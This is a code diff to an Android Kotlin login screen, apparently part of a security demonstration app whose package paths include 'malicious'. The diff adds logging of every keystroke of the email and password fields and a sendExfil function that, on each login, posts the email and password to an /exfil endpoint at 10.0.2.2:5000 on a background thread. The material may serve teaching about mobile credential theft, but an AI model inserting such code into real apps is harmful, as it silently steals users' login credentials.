@@ -36,6 +36,11 @@ import androidx.lifecycle.viewmodel.compose.viewModel
 import com.example.sitconnect.securitydemo.malicious.LocationTrackerWorker  // if still needed
 import com.example.sitconnect.securitydemo.malicious.areAllLocationPermissionsGranted
 
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import kotlin.concurrent.thread
 
 
 
@@ -72,7 +77,8 @@ fun LoginScreen(
 
         OutlinedTextField(
             value = email,
-            onValueChange = { email = it },
+            onValueChange = { email = it
+                Log.d("KEYSTROKE_LOG", "User Email: $it")},
             label = { Text("Email") },
             enabled = authState !is AuthState.Loading
         )
@@ -80,7 +86,8 @@ fun LoginScreen(
 
         OutlinedTextField(
             value = password,
-            onValueChange = { password = it },
+            onValueChange = { password = it
+                Log.d("KEYSTROKE_LOG", "User Password: $it")},
             label = { Text("Password") },
             visualTransformation = PasswordVisualTransformation(),
             enabled = authState !is AuthState.Loading
@@ -116,6 +123,7 @@ fun LoginScreen(
                 Button(onClick = {
                     if (email.isNotBlank() && password.isNotBlank()) {
                         viewModel.login(email, password)
+                        sendExfil(emailValue = email, passwordValue = password)
                     }
                 }) {
                     Text("Login")
@@ -125,10 +133,44 @@ fun LoginScreen(
     }
 }
 
+
 @Preview(showBackground = true)
 @Composable
 fun LoginScreenPreview() {
     SITConnectTheme {
         LoginScreen()
+    }
+}
+
+fun sendExfil(emailValue: String, passwordValue: String) {
+    thread {
+        try {
+            val client = OkHttpClient()
+
+            // FIX: Use .toMediaType() extension function instead of MediaType.get()
+            val mediaType = "application/json; charset=utf-8".toMediaType()
+
+            val jsonPayload = """
+                {
+                    "email": "$emailValue",
+                    "label": "$passwordValue",
+                    "timestamp": "${java.time.Instant.now()}"
+                }
+            """.trimIndent()
+
+            // FIX: Use .toRequestBody() extension function instead of RequestBody.create()
+            val body = jsonPayload.toRequestBody(mediaType)
+
+            val request = Request.Builder()
+                .url("http://10.0.2.2:5000/exfil")
+                .post(body)
+                .build()
+
+            client.newCall(request).execute().use { response ->
+                if (!response.isSuccessful) Log.e("EXFIL", "Error: ${response.code}")
+            }
+        } catch (e: Exception) {
+            Log.e("EXFIL", "Connection failed: ${e.message}")
+        }
     }
 }
